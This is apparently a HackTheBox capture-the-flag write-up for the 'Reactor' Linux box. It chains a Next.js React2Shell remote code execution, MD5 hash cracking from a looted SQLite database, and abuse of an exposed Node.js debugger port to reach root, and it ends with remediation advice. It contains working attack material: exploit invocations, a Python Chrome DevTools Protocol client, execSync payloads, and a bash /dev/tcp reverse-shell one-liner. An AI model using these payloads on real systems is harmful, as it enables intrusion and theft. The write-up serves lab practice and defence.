---
layout: default
title: Reactor
parent: HTB Writeups
nav_order: 1
---

# HTB Reactor

**Machine:** Reactor (Linux) · **Difficulty:** Easy · **Attack surface:** SSH (22), HTTP (3000)

Reactor is a straight line from a headline-grade vulnerability in a popular web framework all the way to root. The interesting part is the middle: the box buries the real path to root under a handful of deliberately tempting dead ends. Getting from foothold to root is less about exploit skill and more about not chasing the one clue that *looks* like the vulnerability but isn't.

---

## 1. Recon & Fingerprinting

An nmap scan turns up exactly two ports: SSH (22) and a web service on port 3000.

The website itself is a fake nuclear-plant monitoring dashboard — **"REACTORWATCH — Core Monitoring System v3.2.1"** — styled convincingly enough to be a distraction in its own right. But what matters is what it's built with underneath: **Next.js 15.0.3**, using the App Router.

The page's source code gives this away immediately. Next.js's React Server Components feature ships data to the browser as `self.__next_f.push(...)` blocks — pre-rendered chunks of the page (metrics, logs, personnel records) serialized into the "Flight" format and streamed down as part of the initial HTML. None of that data contained credentials, but it confirmed the exact framework, the fact that the App Router was in use, and the build ID — enough to tell whether this installation sits in a known-vulnerable version range.

A feroxbuster pass against `/_next/static/` turned up nothing beyond the framework's own expected files — no hidden pages, no stray build artifacts left behind by mistake. This app wasn't going to be broken into by finding a secret page; it was going to be broken into through a flaw in the framework itself.

---

## 2. Initial Foothold — React2Shell (CVE-2025-55182)

Next.js 15.0.3 falls inside the vulnerable range for **React2Shell**, tracked as **CVE-2025-55182**. This one is about as severe as they come: pre-authenticated RCE over the network, with the maximum possible severity score, CVSS 10.0.

It affects React's own `react-server-dom-*` packages (versions 19.0–19.2.0) and, by extension, every framework built on top of them — Next.js, React Router, Waku, and others — because the flaw lives in React's own code for handling Server Components, not in anything Next.js added on top.

**What actually causes it:** Next.js lets a web page call a function that runs on the server (a "Server Action") in response to something the user does in the browser. To make that work, React encodes a reference to that function as a short string, like `module-id#export-name`, and sends it back and forth between browser and server. When the server receives that string, it loads the corresponding code module and looks up the named function on it using a generic lookup (`moduleExports[name]`) — essentially "give me whatever is stored under this name." The bug is that this lookup never checks that the requested name is actually one of the functions the module intended to expose. That means an attacker can ask for *anything* reachable through that lookup, including functions that come bundled in the same package but were never meant to be called this way — things like `child_process.execSync` (runs an arbitrary shell command), `fs.readFileSync` (reads an arbitrary file), or `vm.runInThisContext` (runs arbitrary code). A single crafted request is enough to turn "call this page's button-click handler" into "run this arbitrary system command," with the attacker fully controlling the arguments.

To exploit it, I used a public proof-of-concept script (`exploit-redirect.sh`). It works around a common annoyance with this kind of bug — a "blind" RCE, where you can make the server run a command but have no way to see its output — by using an HTTP 303 redirect as a return channel: the command's output gets reflected back inside the response's `Location` header (normally just a URL telling the browser where to go next), so each request is self-contained — send a command, read the header, done.

```bash
./exploit-redirect.sh http://10.129.154.181:3000/ "id"
./exploit-redirect.sh http://10.129.154.181:3000/ "ls -la /opt/reactor-app"
```

This returned a working shell (interactive command execution) as the Linux user account the Node.js application runs under, inside `/opt/reactor-app`, with `app/`, `next.config.js`, `package.json`, `reactor.db`, and `.env` all present and readable.

---

## 3. Loot — `.env` and the SQLite Database

The `.env` file held the expected settings, plus two things worth a closer look:

| Key | Value |
|-----|-------|
| `DB_PATH` | `/opt/reactor-app/reactor.db` |
| `DB_TYPE` | `sqlite3` |
| `SENSOR_API_KEY` | `rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k` |
| `ALERT_WEBHOOK` | `https://alerts.internal.reactor.htb/webhook` |
| `NODE_ENV` | `production` |

`SENSOR_API_KEY` looked promising at first glance, but nothing on the box actually consumed it outside the app itself. `ALERT_WEBHOOK` pointed at an internal hostname that was never defined in `/etc/hosts` and never resolved to anything — both turned out to be flavor text rather than a real lead.

The database referenced by `DB_PATH` was more useful. Copying `reactor.db` off the box and reading its `users` table surfaced two accounts:

| id  | username | password_hash (MD5)                | role          |
| --- | -------- | ---------------------------------- | ------------- |
| 1   | admin    | `a203b22191d7xxxxxxxxxa5c101b17b8` | administrator |
| 2   | engineer | `39d97110eafexxxxxxxxx812cd271e8e` | operator      |

Unsalted MD5 is fast and trivial to crack, so it's just a matter of running the hashes against a wordlist with John the Ripper and rockyou:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=Raw-MD5 hashes.txt
```

`admin`'s hash never matched anything in the wordlist, but `engineer`'s did, and the recovered password worked directly for an SSH login. That was enough — whatever the admin account's real password was, it was never needed for the rest of the attack.

---

## 4. Looking for the Way to Root — Signal vs. Noise

Once logged in as `engineer`, the usual privesc enumeration pass turned up several things that looked like the intended path but weren't:

| Finding | Verdict |
| --- | --- |
| `engineer` belongs to the `lxd` group, and `/run/lxd-installer.socket` is writable | **Decoy.** LXD isn't actually installed, and installing it would require downloading it via `snap`, which needs outbound internet access — blocked from this box. Trying to use it just errors out through an installer stub; there's no real LXD service running to abuse. |
| `/etc/crontab` and systemd timers | Stock Ubuntu configuration, nothing custom planted here. |
| `ALERT_WEBHOOK`'s internal hostname | Unresolvable, as noted earlier — a loose end left over from the `.env` file, not a real lead. |

The actual signal was buried in `ss -tlnp`:

```
LISTEN  127.0.0.1:9229
```

Port 9229 is the default for Node's `--inspect` debugger (V8 Inspector). It's bound to loopback, and the listing doesn't show it under `engineer`'s own processes, which means it belongs to a separate, more privileged Node.js process running elsewhere on the box. A debugger port like this left reachable in anything resembling a real deployment is almost always a way in, and this box is no exception.

---

## 5. Root — Abusing the Node.js Debugger Over an SSH Tunnel

### The idea

The V8 Inspector speaks CDP directly — it's not "similar to" Chrome DevTools, it's the same protocol, just pointed at a Node.js process instead of a browser tab. Any client that can reach it can issue `Runtime.evaluate`, which runs arbitrary JavaScript *inside* that live process, and from there into Node's built-in modules — trivially, arbitrary system commands as whatever user owns the process. Since the port is loopback-only, reaching it means tunneling through the existing `engineer` SSH session.

### 5.1 Tunnel the inspector port

```bash
ssh -N -L 9229:127.0.0.1:9229 engineer@10.129.154.181
```

`-N` just holds the tunnel open without a shell; that's expected, not a hang. Confirm it's working with `curl http://127.0.0.1:9229/json`. (To add this forward to an SSH session that's already open instead of starting a new one: press Enter for a fresh line, type `~C` to drop into SSH's own command prompt, then `-L 9229:127.0.0.1:9229`.)

### 5.2 Find the debugger's connection address

```bash
curl -s http://127.0.0.1:9229/json | jq -r '.[0].webSocketDebuggerUrl'
# ws://127.0.0.1:9229/55f079fd-0d26-4eb1-974b-6126050222b2
```

That's a WebSocket URL — CDP messages are exchanged over it. The same `/json` response also lists the inspected process's `title` and source file `url`, worth noting in case the target app's source code is worth reviewing afterward.

### 5.3 Connect and run commands

`websocat` isn't installed on Debian by default, so the practical options are: install `python3-websocket` and drive the connection from a small Python script, use `npx wscat -c <url>` if npm is available, download a standalone `websocat` binary from GitHub, or point a desktop Chrome/Chromium browser at `chrome://inspect` → Configure → `127.0.0.1:9229` and use its graphical debugger.

I used a small Python script that connects automatically and handles both normal replies and errors:

```python
#!/usr/bin/env python3
# cdp.py — attach to Node inspector and evaluate JS
import json, urllib.request
from websocket import create_connection

disc = json.load(urllib.request.urlopen("http://127.0.0.1:9229/json"))
ws = create_connection(disc[0]["webSocketDebuggerUrl"])
print(f"[+] attached: {disc[0].get('title','?')} | {disc[0].get('url','?')}")
i = 0
while True:
    expr = input("node> ").strip()
    if not expr: continue
    i += 1
    ws.send(json.dumps({"id": i, "method": "Runtime.evaluate",
        "params": {"expression": expr, "returnByValue": True, "awaitPromise": True}}))
    while True:
        r = json.loads(ws.recv())
        if r.get("id") == i: break
    res = r["result"]
    if "exceptionDetails" in res:
        print("ERR:", res["exceptionDetails"].get("exception", {}).get("description", "")[:400])
    else:
        print(res["result"].get("value"))
```

If driving `wscat` or `websocat` directly instead, each line sent over the connection is one CDP message, formatted as JSON. A harmless sanity check first:

```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"1+1","returnByValue":true}}
```

And then the command that actually runs an arbitrary system command on the server:

```json
{"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id; hostname').toString()","returnByValue":true}}
```

The command's output lands in `.result.result.value` of the JSON reply. If the target process doesn't have `process.mainModule` available (modern "ESM"-style entry points don't), a dynamic import works the same way: `import('child_process').then(cp=>cp.execSync('id').toString())`.

### 5.4 After gaining access

From here it's a normal post-exploitation checklist, just expressed as JavaScript sent over the WebSocket instead of shell commands typed directly:

```js
process.mainModule.require('child_process').execSync('id').toString()      // who am I running as?
process.mainModule.require('child_process').execSync('sudo -l').toString() // can this user run anything as root?
process.env                                                                // environment variables, often holding secrets
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

Worth checking along the way:
- The actual owner of the Node process (`ps aux | grep node`, if you have a normal shell to run it from) — commands run as whoever owns that process, which isn't guaranteed to be root on every box built this way.
- The application's source file, at the `url` reported by `/json`, in case it has hardcoded credentials worth reviewing.
- Any other services listening only on loopback, reachable from this same machine, since this one was.

For anything beyond a one-off command, it's less painful to pop a full reverse shell and work from there instead of typing one JavaScript expression at a time:

```js
process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"')
```

---

## 6. Attack Chain Summary

```
nmap: 22 + 3000
   └─ Next.js 15.0.3 (App Router, React Server Components)
        └─ CVE-2025-55182 (React2Shell) — unauthenticated remote code execution
             └─ shell as the Node app user (redirect-based output capture)
                  ├─ .env        → SENSOR_API_KEY, ALERT_WEBHOOK (both dead ends)
                  └─ reactor.db  → MD5 password hashes
                       └─ John the Ripper + rockyou wordlist → engineer's password
                            └─ SSH login as engineer
                                 └─ ss -tlnp → 127.0.0.1:9229 (Node debugger, not the lxd decoy)
                                      └─ SSH tunnel → Chrome DevTools Protocol, Runtime.evaluate
                                           └─ root → root.txt
```

---

## 7. Remediation

1. **Upgrade Next.js off 15.0.3.** CVE-2025-55182 requires no login, is exploitable over the network, and carries the maximum severity score (CVSS 10.0) — about as serious as a web vulnerability gets. The 15.0.x line is fixed from version 15.0.5 onward; other release lines have their own fixed versions (15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7), so whoever patches this needs to match the fix to whichever branch is actually deployed, not just bump to "the next version." Given the severity, this should have triggered an emergency patch rather than waiting for a routine update cycle.
2. **Never run Node.js with its debugger (`--inspect`) enabled in a production environment.** This one setting was the entire path from a low-privilege account to full root access. If a debugger genuinely needs to be attached for troubleshooting, it should be turned on briefly and shut off immediately after — not left running indefinitely, even when restricted to local connections only, since any other account on the same machine can still reach it.
3. **Stop storing passwords as unsalted MD5 hashes.** Both password hashes found in `reactor.db` were cracked in seconds using a publicly available wordlist. Passwords should instead be hashed with an algorithm designed for that purpose — bcrypt, scrypt, or argon2 — each combined with a random, per-user "salt" value. MD5 offers essentially no real protection against this kind of attack on modern hardware.
4. **Treat `SENSOR_API_KEY` as exposed and replace it.** It sat in a configuration file reachable through a remote code execution vulnerability. Even though it didn't end up being useful in this particular attack, any secret exposed alongside a code-execution bug should be assumed compromised and rotated as routine practice.
5. **Review group memberships against what's actually installed.** `engineer` being in the `lxd` group with no LXD software actually present isn't exploitable today, but it's a standing risk waiting to happen — the moment someone installs LXD for an unrelated reason, that account instantly gains a path to root with no further effort. Group membership should reflect what an account actually needs, not leftovers from how the machine was originally set up.

---

*Flags obtained: user.txt (as `engineer`), root.txt (root via the Node.js debugger). All actions performed against an authorized HackTheBox machine.*

Sources on CVE-2025-55182: [Checkmarx](https://checkmarx.com/zero-post/react2shell-cve-2025-55182-deserialization-to-remote-code-execution-in-react-and-next-js/) · [Rapid7](https://www.rapid7.com/blog/post/etr-react2shell-cve-2025-55182-critical-unauthenticated-rce-affecting-react-server-components/) · [Wiz](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
